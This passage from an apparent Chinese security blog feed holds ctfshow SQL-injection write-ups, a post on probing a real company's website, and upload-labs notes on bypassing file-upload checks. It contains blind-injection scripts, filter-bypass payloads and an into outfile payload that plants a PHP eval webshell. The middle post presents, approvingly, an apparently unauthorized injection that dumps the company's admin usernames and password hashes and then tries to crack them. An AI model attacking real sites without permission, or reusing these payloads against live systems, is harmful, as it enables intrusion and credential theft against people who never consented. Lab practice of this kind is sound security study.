id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h3><p>这里有个坑点，就是选择第四关后，url还是第三关的，得手动把数字3改成4</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web174.png"></p><p>有点过滤了，对结果进行过滤，flag肯定是带有数字的所有不给与显示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/flag|[0-9]/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>方法1：将查询到的flag使用sql替换函数将数字替换为字符，就能输出了（ctfshow 大菜鸡师傅解法）</p><p>方法2：用盲注的方式拿flag，用的substr语句和页面回显查询出的admin语句来结合利用（南神的解法）。url需要抓包复制，题目直接给的url不带API</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web174-2.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># Author: MTRleed</span></span><br><span class="line"><span class="comment"># file: web174</span></span><br><span class="line"><span class="comment"># time: 2023/11/15 9:58</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://59f351a4-07c2-4142-b21b-6ffca225919c.challenge.ctf.show/api/v4.php&quot;</span></span><br><span class="line"><span class="built_in">dict</span> = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27; and substr((select password from ctfshow_user4 where username=\&quot;flag\&quot;),<span class="subst">&#123;i&#125;</span>,1)=\&quot;<span class="subst">&#123;j&#125;</span>\&quot;--+&quot;</span></span><br><span class="line">        gloal = url + payload</span><br><span class="line">        res = requests.get(url=gloal)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web174-1.png"></p><h3 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h3><p>这题的匹配规则把ascii码表中全部字符给禁了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/[\x00-\x7f]/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web175.png"></p><p>不过我们还可以利用时间盲注的方法来判断获取flag，先说一下mysql中的if判断方法吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(expr1,expr2,expr3)  </span><br></pre></td></tr></table></figure><p>如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 if()的返回值为expr2; 否则返回值则为 expr3。写个时间盲注脚本来跑 (南神)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># Author: MTRleed</span></span><br><span class="line"><span class="comment"># file: web175</span></span><br><span class="line"><span class="comment"># time: 2023/11/15 10:39</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://791fe708-210d-4f2d-8f9e-bcbc6ab3de4b.challenge.ctf.show/api/v5.php&quot;</span></span><br><span class="line"><span class="built_in">dict</span> = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27; and if(substr((select password from ctfshow_user5 where username=\&quot;flag\&quot;),<span class="subst">&#123;i&#125;</span>,1)=\&quot;<span class="subst">&#123;j&#125;</span>\&quot;,sleep(5),0)--+&quot;</span></span><br><span class="line">        gloal = url + payload</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.get(url=gloal)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end-start &gt; <span class="number">4.9</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web175-1.png"></p><p>解法2：</p><p>可以写文件getshell</p><p>测试通过页面回显可知有两个位置</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web175-2.png"></p><p>写文件（实际环境中文件写入要判断secure_file_priv参数）</p><blockquote><p>secure_file_priv为NULL，表示禁止限制操作<br>secure_file_priv为某一目录，表示只能操作该目录下的文件<br>secure_file_priv为空，表示不对读写文件进行限制</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">命令：show global variables like &quot;secure%&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>写文件，需要一句话需要base+url编码一下，直接发也行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union  select 1,&quot;&lt;?php eval($_POST[&#x27;pass&#x27;])?&gt;&quot; into outfile &#x27;/var/www/html/1.php&#x27;-- -</span><br><span class="line">编码后：</span><br><span class="line">-1&#x27; union  select 1,from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4a%33%42%68%63%33%4d%6e%58%53%6b%2f%50%67%3d%3d&quot;) into outfile &#x27;/var/www/html/1.php&#x27;-- -</span><br></pre></td></tr></table></figure><p>文件是写进去了，但是显示语法错误</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web175-4.png"></p><p>重启环境再次上传可以成功</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web175-7.png"></p><p>查看数据库配置可以指定账号密码root/root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass=system(&#x27;tac&#x27; ./api/config.php&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web175-8.png"></p><p>蚂剑getshell然后连接数据库即可</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web175-9.png"></p><p>检测数据库类型</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web175-10.png"></p><p>选择对应数据库然后输入账号密码连接添加</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web175-11.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web175-12.png"></p><p>方法3：</p><p>既然我们知道可以写文件，那么我们可以将flag写进另一个文件然后访问该文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(password) from ctfshow_user5 into outfile &#x27;/var/www/html/1.txt&#x27;-- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web175-6.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web175-5.png"></p><h3 id="web176（SQL语句有过滤↓↓↓）"><a href="#web176（SQL语句有过滤↓↓↓）" class="headerlink" title="web176（SQL语句有过滤↓↓↓）"></a>web176（SQL语句有过滤↓↓↓）</h3><p>本题开始有过滤，出题人挺幽默</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web176.png"></p><p>执行查列名还是正常回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 3-- -</span><br></pre></td></tr></table></figure><p>但是但是在查显示位的时候报错了，肯定是在这过滤了，先从大小写和双写开始</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union selecT 1,2,3-- - //原来是select被过滤，任意一个大写即可绕过</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web176-1.png"></p><p>前面已经知道了数据库结构，这里我们直接拿flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union selecT password,2,3 from ctfshow_user-- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web176-2.png"></p><h3 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;--+ 不可以</span><br><span class="line">1&#x27;%23 可以</span><br><span class="line">1&#x27; %23 不可以</span><br></pre></td></tr></table></figure><p>确定这一题过滤了空格和–+，可以用%0a(空格)和%23(#)代替。</p><p>语句是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注释符被绕还可以or&#x27;1或||&#x27;1绕过</span><br><span class="line">我们的输入是：1&#x27;or&#x27;1</span><br><span class="line">select username,password from user where username !=&#x27;flag&#x27; and id =&#x27;1&#x27;or&#x27;1 limit 1;</span><br></pre></td></tr></table></figure><p>绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;%0aunion%0aselect%0apassword,2,3%0afrom%0actfshow_user%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web176-4.png"></p><h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h3><p>使用上一题的payload</p><h3 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h3><p>注释被过滤，可以<code>%23</code>;空格被过滤，%0a不能用了可以用%0c(换页符)代替</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;%0cunion%0cselect%0cpassword,2,3%0cfrom%0cctfshow_user%23</span><br></pre></td></tr></table></figure><h3 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h3><p>这一题注释符#<code>%23</code>被过滤可以用<code>||&#39;</code>替代，空格依旧可以%0c(换页符)</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web180.png"></p><p>但是<code>||&#39;</code>不能直接用在SQL查询语句中</p><p>所以要这样，使用<code>group_concat(password)</code>输出所有<code>where%0c&#39;1&#39;=&#39;1</code></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union%0cselecT%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0c&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>语句是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username !=&#x27;flag&#x27; and id =&#x27;1&#x27; where &#x27;1&#x27;=&#x27;1 limit 1;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web180-2.png"></p><h3 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h3><p>这题过滤的代码放出来了，%0c也不能用了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//一些符号的16进制</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web181.png"></p><p>这次把已知的能用的绕过空格方法都给过滤了，不过还可以采用运算符的方式来精心构造一个万能密码，先放出payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;or(id=26)and&#x27;1</span><br></pre></td></tr></table></figure><p>前面我们已经知道表的结构是<code>id,username,password</code>，所以我们通过查id的方式去找flag，而用运算符中，<code>and</code>的优先级比<code>or</code>高，这句话放到查询语句中就变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=&#x27;-1&#x27;or(id=26)and&#x27;1&#x27; limit 1;</span><br><span class="line">也就是</span><br><span class="line">(id=&#x27;-1&#x27;) or ((id=26) and &#x27;1&#x27;) limit 1;</span><br><span class="line">前面为0，后面为1，所以整个条件为1</span><br></pre></td></tr></table></figure><h3 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h3><p>过滤与上一题相比多了一个flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>继续用上一题的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;or(id=26)and&#x27;1</span><br></pre></td></tr></table></figure><h3 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h3><p>这一题的查询语句变了，过滤也把and过滤了</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web182.png"></p><p>打开网站后根据提示，利用post传参，值为表名，根据之前的题我们知道表名是“ctfshow_user”，所以post一下</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web183.png"></p><p>发现返回值为22，说明有22行数据，这里看返回逻辑把空格和等号以及一些常用的语句给ban掉了，空格的话尝试用括号扩住来让语句正常执行，等号用like来替代，然后用where和<code>%</code>来匹配数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post：tableName=(ctfshow_user)where(pass)like&#x27;ctfshow%&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web183-1.png"></p><p>发现返回值为1，说明执行成功，我们写一个脚本来跑剩下的flag</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web183-2.png"></p><h3 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;菜鸡小白，日常&lt;strong&gt;练练web&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;hea</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.mtrleed.top/categories/CTF/"/>
    
    
    <category term="Web" scheme="https://www.mtrleed.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>对某公司渗透实测</title>
    <link href="https://www.mtrleed.top/post/1/"/>
    <id>https://www.mtrleed.top/post/1/</id>
    <published>2021-11-07T09:32:38.863Z</published>
    <updated>2023-03-04T02:28:51.832Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这阵子练习太多的CTF有点乏了，打算回头看看老本行，但是碍于本人太菜了😭，只能找找相对简单，大师傅们不屑一顾的站点，于是乎在我不经意间发现了某公司网站</p><h2 id="漏掉的点"><a href="#漏掉的点" class="headerlink" title="漏掉的点"></a>漏掉的点</h2><p>起初我是奔着弱口令去的，但对该公司的后台管理系统疯狂尝试了半天后无果，你以为我就这样放弃了吗？<del>那你真的是猜的很准</del>。</p><p>于是我又回到公司主页，随手在url 里添加了id 参数，不试不知道，一试吓一跳。当将数值取1 时页面有反馈    </p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/file/3575.png">    </p><p>​     </p><h2 id="尝试注入"><a href="#尝试注入" class="headerlink" title="尝试注入"></a>尝试注入</h2><p>在发现参数可改且有不同反馈之后进行下一步测试</p><p>先试试不考虑过滤的查显示位 sql 语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span><span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/3576.png">    </p><p>意不意外，惊不惊喜？该公司网站并没有对敏感字符做过滤，于是乎我们就查到了一些数据库里的信息。</p><p>发现数据库中存在 admin表，表中有 id,username,password,quanxian 参数</p><p>​       </p><p>废话不多说，赶紧看一下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(concat(id,<span class="number">0x7e</span>,username,<span class="number">0x3A</span>,password,<span class="number">0x3A</span>,quanxian,<span class="number">0x7e</span>)) <span class="keyword">from</span> admin),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/3577.png"></p><p>可以看到用户名为 nie 的具有admin权限，心里美滋滋，解密后就可以登录后台啦嘿嘿。密码是加密过的</p><p>​       </p><p>于是反手就是丢解密工具里去了。。。。。。</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/71609.png"></p><p>​               真服了。。。。。。</p><p>​                                                            <img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/0g9nf.jpg"></p><p>​           既然解密未果，那此次的渗透就到此为止啦 ~</p><p>​         </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>对目标漏洞的寻找要全方位，不放过任何一个细节</strong></p><div align="center"> 好啦，又水一个洞 </font>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这阵子练习太多的CTF有点乏了，打算回头看看老本行，但是碍于本人太菜了😭，只能找找相对简单，大师傅们不屑一顾的站点，于是乎在我不经意间发现</summary>
      
    
    
    
    <category term="SQL注入" scheme="https://www.mtrleed.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="注入" scheme="https://www.mtrleed.top/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>文件上传/包含学习</title>
    <link href="https://www.mtrleed.top/post/9/"/>
    <id>https://www.mtrleed.top/post/9/</id>
    <published>2021-09-01T16:00:00.000Z</published>
    <updated>2023-03-02T01:33:36.428Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文记录对文件上传和文件包含漏洞的练习</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>原理：上传文件的时，如果未对上传的文件进行严格的验证和过滤，就容易造成文件上传漏洞，上传脚本等。导致网站甚至整个服务器被控制，恶意的脚本文件又称为WebShell，WebShell具有强大的功能，如查看服务器目录、执行系统命令等，十分危险。</p><p>利用方式：先寻找上传点，比如头像处，只要能找到上传点就有机会</p><p>靶场训练：upload靶场<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/11.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/0QQ%E6%88%AA%E5%9B%BE-2.png"></p><p><strong>1关</strong></p><p>前端 js 验证</p><p>直接上传php文件发现 限制了文件后缀</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/Q%E6%88%AA%E5%9B%BE3.png"></p><p>抓包试试</p><p>开启代理后点击上传还是在前台显示弹窗，说明这是前台的 js 限制</p><p>查看源代码，的确如此</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/Q%E6%88%AA%E5%9B%BE4.png"></p><p>直接F12 修改 js ，将php设为允许（不成功，无法修改）</p><p>或者将php文件改为允许的后缀名，抓包后在修改回php即可绕过前端的验证</p><p>随后使用文件所在路径 <a href="http://127.0.0.1/upload-labs-master/upload/3.php">http://127.0.0.1/upload-labs-master/upload/3.php</a> 用蚁剑连接即可</p><p>​       </p><p><strong>2关</strong></p><p>仅判断content-type，修改content-type绕过,修改为image/jpeg、image/png、image/gif任何一个都可以。</p><p>MIME类型限制</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/Q%E6%88%AA%E5%9B%BE5.png"></p><p>直接上传.php文件显示格式不允许，抓包后发现 MIME 类型为 application/octet-stream 尝试把它改成 image/jpeg ，放包，成功</p><p>​      </p><p><strong>3关</strong></p><p>黑名单  不允许上传.asp,.aspx,.php,.jsp后缀文件</p><p>尝试绕过大小写绕过 pHp，失败。尝试替代品但是又能以php的形式解析的 php3 ,php5,phtml</p><p>成功，连接格式 GBK– base64（不是php后缀无法使用蚁剑连接）</p><p>​      </p><p><strong>4关</strong></p><p>黑名单 禁止（”.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.php1”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.pHp1”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.ini”）</p><p>可以上传 .htaccess </p><p>.htaccess文件,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p><p>上传一个.htaccess文件，在里面写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>这样所有文件都会解析为php。然后我们再上传图片马，就可以成功解析了</p><p>​      </p><p><strong>5关</strong></p><p>黑名单 禁止（”.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.htaccess”）</p><p>但是没有大小写转换。抓包，改文件名为 .PHp 大小写绕过</p><p>​      </p><p><strong>6关</strong></p><p>黑名单 禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件！</p><p>但是<code> $file_ext = trim($file_ext); //首尾去空</code> ，我们可以在a.php前或后加一个或多个空格绕过</p><p>​        </p><p><strong>7关</strong></p><p>黑名单 禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！</p><p>但是<code>$file_name = deldot($file_name);//删除文件名末尾的点</code>,所以我们可以在 .php后缀名后加 . 进行绕过</p><p>​        </p><p>**8关 **</p><p>黑名单 禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！</p><p>但是<code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code>，所以我们可以在 .php后缀名处加上 ::$DATA 变成 .php::$DATA 绕过</p><p>​       </p><p>**9关 **</p><p>黑名单 